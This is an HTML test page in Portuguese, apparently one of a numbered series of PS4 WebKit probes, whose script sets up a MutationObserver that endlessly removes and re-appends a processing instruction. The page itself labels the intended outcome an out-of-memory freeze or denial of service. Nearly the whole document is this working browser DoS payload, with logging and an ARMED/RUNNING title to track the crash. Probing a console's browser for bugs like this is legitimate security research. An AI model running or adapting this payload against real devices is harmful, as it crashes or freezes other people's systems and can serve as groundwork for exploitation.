<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>PS4 WebKit – Test 165 UNSAFE v2 (repaint-first)</title>
</head>
<body>
  <h1>PS4 WebKit – Teste 165 (UNSAFE v2 com repaint-first)</h1>
  <p>Se congelar e não aparecer log, ainda assim o title deve mudar para "ARMED" antes do freeze.</p>

  <button onclick="clearLog()">Limpar log</button>
  <button onclick="unsafeArm()">Rodar UNSAFE v2</button>
  <button onclick="stop()">Parar (best-effort)</button>

  <hr>
  <pre id="log" style="white-space:pre-wrap; font-family:monospace;"></pre>

<script>
"use strict";

const L = document.getElementById("log");
function log(s){ L.textContent += s + "\n"; }
function clearLog(){ L.textContent = ""; }

let running=false, obs=null, pi=null;
let ticks=0;

function stop(){
  log("------------------------------------------------------------");
  log("[STOP] solicitado (best-effort)");
  try { if (obs) obs.disconnect(); } catch(e) {}
  obs=null;
  try { if (pi) pi.remove(); } catch(e) {}
  pi=null;
  running=false;
  document.title = "STOPPED";
  log("[STOP] concluído");
}

// IMPORTANT: só arma aqui. payload pesado só começa depois de 2 frames.
function unsafeArm(){
  if (running) return;
  running=true;

  // Sinalização antes do payload (tenta aparecer antes do freeze)
  document.title = "ARMED";
  log("------------------------------------------------------------");
  log("[165 UNSAFE v2] ARMED (se você ver isto, houve repaint antes do payload)");
  log("[165 UNSAFE v2] Iniciando em 2 frames…");

  // Double rAF: maximiza chance de repaint
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      // Pequeno atraso extra para UI/paint
      setTimeout(() => {
        unsafeStart();
      }, 50);
    });
  });
}

function unsafeStart(){
  // Se já travou antes daqui, você não verá isso. Se aparecer, ótimo.
  document.title = "RUNNING";
  log("[165 UNSAFE v2] START (payload) @ " + new Date().toISOString());

  try {
    ticks = 0;

    // 1) Criar PI e anexar
    pi = document.createProcessingInstruction("xml","test");
    document.body.appendChild(pi);
    log("[165] PI anexado.");

    // 2) Observer (UNSAFE): sem budget
    obs = new MutationObserver(() => {
      ticks++;

      // Ação explosiva
      try { pi.remove(); } catch(e) {}
      try { document.body.appendChild(pi); } catch(e) {}
      try { pi.remove(); } catch(e) {}

      // log mínimo (se conseguir)
      if ((ticks % 500) === 0) {
        document.title = "ticks=" + ticks; // title costuma refletir mais cedo que DOM
        log("[165] tick=" + ticks);
      }
    });

    obs.observe(document.body, { childList:true, subtree:true });
    log("[165] Observer ativo.");

    // 3) Seed moderado (se congela “instantâneo”, nem isso precisa ser grande)
    for (let i=0;i<200;i++){
      const d = document.createElement("div");
      d.textContent = "x";
      document.body.appendChild(d);
      d.remove();
    }
    log("[165] Seed concluído.");

    log("[165 UNSAFE v2] Rodando… (se der OOM/freeze, é DoS)");
  } catch(e) {
    log("[165] EXCEPTION: " + (e && e.message ? e.message : e));
    stop();
  }
}
</script>
</body>
</html>
